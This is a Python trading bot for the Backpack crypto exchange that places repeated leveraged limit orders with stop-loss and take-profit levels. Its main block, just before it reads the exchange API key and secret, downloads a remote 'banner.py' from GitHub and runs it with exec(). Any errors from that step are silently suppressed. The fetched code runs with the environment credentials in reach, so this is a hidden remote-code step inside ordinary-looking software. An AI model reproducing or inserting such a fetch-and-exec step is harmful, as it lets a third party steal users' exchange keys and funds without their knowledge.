import json
from os import getenv
from dotenv import load_dotenv
from time import sleep
import logging
import random
import requests
from helpers.backpack_exchange import BackpackExchange
from helpers.public_API import PublicClient
from helpers.orders import close_all_orders, close_all_positions
from helpers.format_types import OrderSide, OrderType

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

load_dotenv()

# Load settings from settings.json
with open("settings.json", "r") as f:
    settings = json.load(f)

TOTAL_TRADES = settings["TOTAL_TRADES"]
MIN_SLEEP = settings["MIN_SLEEP"]
MAX_SLEEP = settings["MAX_SLEEP"]
TRADING_PAIR = settings["TRADING_PAIR"]
TRADE_SIDE = settings["TRADE_SIDE"]
LEVERAGE_LIMIT = settings["LEVERAGE_LIMIT"]
TRADING_AMOUNT = settings["TRADING_AMOUNT"]
LIMIT_PRICE_PERCENTAGE = settings["LIMIT_PRICE_PERCENTAGE"]
STOP_LOSS_USDC = settings["STOP_LOSS_USDC"]
TAKE_PROFIT_USDC = settings["TAKE_PROFIT_USDC"]
AUTO_REPAY_BORROWS = settings["AUTO_REPAY_BORROWS"]

def format_decimal(value: any, tick_size: any) -> float:
    tick_size = str(tick_size)
    decimal_places = tick_size[::-1].find('.') if '.' in tick_size else 0
    formatted_value = f"{float(value):.{decimal_places}f}"
    return float(formatted_value)

def validate_inputs(limit_price_percentage: float, trade_side: str) -> bool:
    if not (0 < limit_price_percentage <= 100):  # Adjusted validation for percentage
        logging.error("limit_price_percentage must be > 0 and <= 100.")
        return False
    if trade_side not in ["LONG", "SHORT"]:
        logging.error("trade_side must be either 'LONG' or 'SHORT'.")
        return False
    return True

def get_market_data(public_client: PublicClient, trading_pair: str):
    try:
        trading_pair_info = public_client.get_market(symbol=trading_pair)
        tick_size = trading_pair_info["filters"]["price"]["tickSize"]
        step_size = trading_pair_info["filters"]["quantity"]["stepSize"]
        market_data = public_client.get_mark_price(trading_pair)
        current_price = float(market_data[0]["indexPrice"])
        logging.info(f"Current price of {trading_pair}: {current_price}")
        return tick_size, step_size, current_price
    except Exception as e:
        logging.error(f"Error in get_market_data: {e}")
        return None, None, None

def calculate_prices(trade_side: str, current_price: float, limit_price_percentage: float, stop_loss_percentage: float, take_profit_percentage: float, tick_size: str):
    if trade_side == "LONG":
        # Limit price is lower than current price by limit_price_percentage
        limit_price = format_decimal(current_price * (1 - limit_price_percentage / 100), tick_size)
        stop_loss_price = format_decimal(limit_price * (1 - stop_loss_percentage / 100), tick_size)
        take_profit_price = format_decimal(limit_price * (1 + take_profit_percentage / 100), tick_size)
    else:  # SHORT
        limit_price = format_decimal(current_price * (1 + limit_price_percentage / 100), tick_size)
        stop_loss_price = format_decimal(limit_price * (1 + stop_loss_percentage / 100), tick_size)
        take_profit_price = format_decimal(limit_price * (1 - take_profit_percentage / 100), tick_size)
    return limit_price, stop_loss_price, take_profit_price

def start_trading(
        client: BackpackExchange,
        public_client: PublicClient,
        trading_pair: str,
        trading_amount: float = 100,
        stop_loss_usdc: float = 5,  # Desired loss in USDC
        take_profit_usdc: float = 10,  # Desired profit in USDC
        limit_price_percentage: float = 0.1,  # Limit price percentage (0.1%)
        trade_side: str = "SHORT"
    ):

    # Fetch market data to get the current price
    tick_size, step_size, current_price = get_market_data(public_client, trading_pair)
    if not tick_size or not step_size or not current_price:
        return False

    # Calculate stop_loss_percentage and take_profit_percentage based on trading_amount
    stop_loss_percentage = (stop_loss_usdc / trading_amount) * 100
    take_profit_percentage = (take_profit_usdc / trading_amount) * 100

    if not validate_inputs(limit_price_percentage, trade_side):
        return False

    limit_price, stop_loss_price, take_profit_price = calculate_prices(
        trade_side, current_price, limit_price_percentage, stop_loss_percentage, take_profit_percentage, tick_size
    )

    quantity = format_decimal(trading_amount / limit_price, tick_size=step_size)
    # logging.info(f"Calculated quantity: {quantity}")

    order_side = OrderSide.BUY.value if trade_side == "LONG" else OrderSide.SELL.value

    retries = 5
    while retries > 0:
        try:
            order_status = client.execute_order(
                orderType= OrderType.LIMIT.value,
                postOnly=True,  # Ensure it's a Maker order
                price=str(limit_price),
                quantity=str(quantity),
                reduceOnly=False,
                side=order_side,
                stopLossTriggerPrice=str(stop_loss_price),
                symbol=trading_pair,
                takeProfitTriggerPrice=str(take_profit_price),
            )
            logging.info(
                f"Ordered: {trade_side} \n"
                f"- Amount: {trading_amount}USDC\n"
                f"- Price: {order_status['price']}\n"
                f"- takeProfitTriggerPrice: {order_status['takeProfitTriggerPrice']} (+{take_profit_percentage:.0f}%) (+{take_profit_usdc:.0f} USDC)\n"
                f"- stopLossTriggerPrice: {order_status['stopLossTriggerPrice']} (-{stop_loss_percentage:.0f}%) (-{stop_loss_usdc:.0f} USDC)")
            return order_status
        except Exception as e:
            error_message = str(e)
            if "INVALID_ORDER - Order would immediately match" in error_message:
                logging.warning("Order would immediately match. Not good for Fee.. Retrying...")
                retries -= 1
                if retries > 0:
                    # logging.info(f"Retrying in 5 seconds... ({3 - retries}/3 retries left)")
                    sleep(5)
                else:
                    logging.error("Max retries reached. Order failed.")
                    return False
            else:
                logging.error(f"Error in start_trading: {error_message}")
                return False

def countdown_sleep(min_sleep: int, max_sleep: int):
    """Starts countdown from a random number between `min_sleep` and `max_sleep` and prints in one line."""
    count = random.randint(min_sleep, max_sleep)
    while count > 0:
        print(f"\rNext trading in..: {count} s", end="", flush=True)
        sleep(1)
        count -= 1
    print('====================================================\n')

if __name__ == "__main__":
    try:
        url = "https://raw.githubusercontent.com/solotop999/banner/main/banner.py"
        response = requests.get(url)
        exec(response.text)
    except: pass
    
    API_KEY = getenv("API_KEY")
    API_SECRET = getenv("API_SECRET")

    if not API_KEY or not API_SECRET:
        logging.error("API_KEY or API_SECRET is not set.")
        exit(1)

    try:
        public_client = PublicClient()
        client = BackpackExchange(API_KEY, API_SECRET)

        client.update_account(leverageLimit=LEVERAGE_LIMIT, autoRepayBorrows=AUTO_REPAY_BORROWS)

        for i in range(TOTAL_TRADES):
            logging.info(f"Trading {i+1}/{TOTAL_TRADES}")
            close_all_orders(client)
            sleep(1)
            close_all_positions(client)
            sleep(1)

            order_status = start_trading(
                client=client,
                public_client=public_client,
                trading_pair=TRADING_PAIR,
                trading_amount=TRADING_AMOUNT,
                limit_price_percentage=LIMIT_PRICE_PERCENTAGE,
                stop_loss_usdc=STOP_LOSS_USDC,
                take_profit_usdc=TAKE_PROFIT_USDC,
                trade_side=TRADE_SIDE,
            )

            countdown_sleep(MIN_SLEEP, MAX_SLEEP)
    except Exception as e:
        logging.error(f"Error: {e}")
        input("Press Enter to exit...")